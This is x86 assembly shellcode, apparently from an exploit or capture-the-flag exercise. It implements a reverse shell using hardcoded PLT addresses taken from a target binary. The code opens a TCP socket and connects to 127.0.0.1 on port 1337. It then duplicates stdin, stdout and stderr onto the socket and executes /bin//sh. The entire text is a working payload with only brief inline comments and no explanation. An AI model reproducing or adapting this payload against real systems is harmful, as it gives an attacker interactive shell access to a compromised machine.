sub esp, 0x128
push 0 								#ipproto_ip
push 1								#sock_Stream
push 2								#AF_INET
mov ebx, 0x08048730
call ebx 							# socket(AF_INET, SOCK_STREAM, IPPROTO_IP) # objdump :  8048730 
mov edx, eax 						# save socket fd
add esp, 12

#####connect()#########
sub esp, 0x10
mov dword ptr [esp], 0x00000000
mov dword Ptr [esp+4], 0x00000000
mov dword Ptr [esp+8], 0x00000000
mov dword Ptr [esp+12], 0x00000000
			
mov dword ptr [esp+4], 0x0100007f 	# ip address 127.0.0.1
mov word ptr [esp+2], 0x3905 		# port 1337, littile endian
mov word ptr [esp], 2 				# AF_INET
mov ecx, esp 						# save pointer to the sockaddr

push 0x10 							# sizeof(struct sockaddr) 
push ecx 							# &sockaddr
push edx 							# socketfd
mov ebx, 0x08048750
call ebx 							# connect(socket, &sockaddr, sizeof(sockaddr) )   #				objdump: 8048750   
#######################

pop edx
add esp, 24
###########dup
push 0 								# stdin
push edx 							# socketfd
mov ebx, 0x08048600
call ebx 							# dup(stdin, socket) : stdin--->socketfd , objdump: 8048600

pop edx
add esp, 4

push 1  							# stdout
push edx 							# socket fd
mov ebx, 0x08048600
call ebx 							# dup(sockfd, stdout) : stdout---->sockfd 	 

pop edx
add esp, 4		

push 2  							# stdout
push edx 							# socket fd
mov ebx, 0x08048600
call ebx 							# dup(sockfd, stdout) : stderr---->sockfd 	 

add esp, 8

#############

push 0 								# '\0' of  /bin//sh, needs to be double slash for unix, littile endian
push 0x68732f2f 					# //sh
push 0x6e69622f 					# /bin
mov ecx, esp
push 0 								# args=NULL
push ecx 							# point to /bin/sh
mov ebx, 0x080486d0
call ebx 							# execv("/bin/sh", NULL)						, objdump: 80486d0